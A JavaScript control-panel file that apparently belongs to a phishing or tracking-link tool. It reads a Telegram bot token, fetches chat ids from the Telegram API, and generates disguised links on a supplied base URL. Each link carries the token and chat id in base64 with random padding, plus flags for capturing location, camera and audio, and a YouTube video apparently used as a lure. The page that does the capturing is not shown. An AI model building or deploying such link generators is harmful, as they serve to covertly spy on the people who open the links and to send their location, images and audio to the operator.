const botTokenInput = document.getElementById('botTokenInput'); //token input
const startBotButton = document.getElementById('startBotButton'); //start bot button
const procedureMessage = document.getElementById('procedureMessage'); //display procedure alert
const chaidList = document.getElementById('chaidList'); //list contains latest chat ids
const url_result = document.getElementById('url_result'); //input which holds generated url
const updateMessages = document.getElementById('updateMessages'); //update message button
const copy_to_clipboard = document.getElementById('copy_to_clipboard'); //copy to clipboard button
const urlInput = document.getElementById('urlInput'); //copy to clipboard button
const videoId = document.getElementById('videoId'); //copy to clipboard button


//hide procedure message alert
procedureMessage.style.display = 'none';

//dynamic
let update_id = 0; //the update id dynamic variable
let telegram_message_data = []; //holds all latest message from telegram

//copy text to clipboard
function copyToClipboard() {
    url_result.select();
    url_result.setSelectionRange(0, 99999);  // For mobile devices

    // Using Clipboard API to copy
    navigator.clipboard.writeText(url_result.value)
        .then(() => {
            alert('Text copied to clipboard!');
        })
        .catch(err => {
            console.error('Error copying text: ', err);
        });
}



//generate url or the website with botToken and chhat id encoded base64
const makeURL=(chat_id)=>{
    const encoded = btoa(`${botTokenInput.value}|${chat_id}`);
    const  randomIndex = Math.floor(Math.random() * 26);
    let randomLetter = String.fromCharCode(65 + randomIndex);
    let additional_feature = "b";
    if(document.getElementById("locationCheckbox").checked){additional_feature+="l"};
    if(document.getElementById("cameraCheckbox").checked){additional_feature+="c"};
    if(document.getElementById("audioCheckbox").checked){additional_feature+="s"};
    
    if(urlInput.value!=""){url_result.value= `${urlInput.value}?val=${randomLetter}${encoded}${randomLetter}&opt=${additional_feature}&yt=${videoId.value!=""?videoId.value:"Il95c-E1nnU"}`;}
    else{url_result.value = `Base url Required`}
    

}

//update the list contents
const updateListGroup=()=>{
    let finalData = "";
    telegram_message_data.forEach((element)=>{
        finalData +=`<li class="list-group-item chatIdItem" onclick=makeURL("${element.id}")>${element.id}  -> ${element.name}</li>`
    })
    chaidList.innerHTML = finalData;

}

//update the telegram bot message 
const updateMessage=async(token)=>{
    try{
        const response = await axios.get(`https://api.telegram.org/bot${token}/getUpdates`);
        const ok = response.data.ok;
        if(ok === true){
            const messages = response.data.result;
            const lastMessage = messages[messages.length -1];
            const last_update_id = lastMessage.update_id;
            const last_chat_id = lastMessage.message.chat.id;
            const last_name = lastMessage.message.chat.username;
            const last_message = lastMessage.message.text;
            if(last_update_id != update_id){
                update_id = last_update_id;
                if( last_message === "/start get_ID"){
                    telegram_message_data.push({id:last_chat_id,name:last_name});
                    updateListGroup()
                    const response_offset = await axios.get(`https://api.telegram.org/bot${token}/getUpdates?offset=${last_update_id}`);//offset
                }
            }
            else{
                console.log("No new Messages..");
            }
        }
        else{
            console.log("Error occured : "+response);
        }
    }catch(e){
        alert("error Occurred : "+e);
    }
}

//get bot details
const getBotDetails=async(token)=>{
    try{
        const response =  await axios.get(`https://api.telegram.org/bot${token}/getMe`);
        const ok = response.data.ok;
        if(ok === true){
            const data = response.data.result;
            const username = data.username;
            procedureMessage.innerHTML = `<span>• Click link :  <a class="botNameLink" href="https://t.me/${username}?start=get_ID" target="_blank"><strong class="botname">[${username}]</strong></a></span><br><span>• Press /start (on Telegram)</span><br><span>• Click update "<i class="bi bi-arrow-clockwise"></i>" button</span>`;
            procedureMessage.style.display = 'block'; 
        }
        else{
            procedureMessage.innerHTML = `<span>• Bot not found`;
            procedureMessage.style.display = 'block';
        }
    }catch(e){
        procedureMessage.innerHTML = `<span>• Bot not found</span>`;
        procedureMessage.style.display = 'block';
    } 
}


//click event start button
startBotButton.addEventListener('click',()=>{
    const botToken = botTokenInput.value
    if(botToken!=""){getBotDetails(botToken);}
    else{alert("bot token required");}
})

//update/refresh the latest messages
updateMessages.addEventListener('click',()=>{
    if(botTokenInput.value!=""){
        updateMessage(botTokenInput.value);
    }
    else{
        alert("bot token required");
    }
});


//copy to clipboard button
copy_to_clipboard.addEventListener("click",()=>{
    copyToClipboard();
});
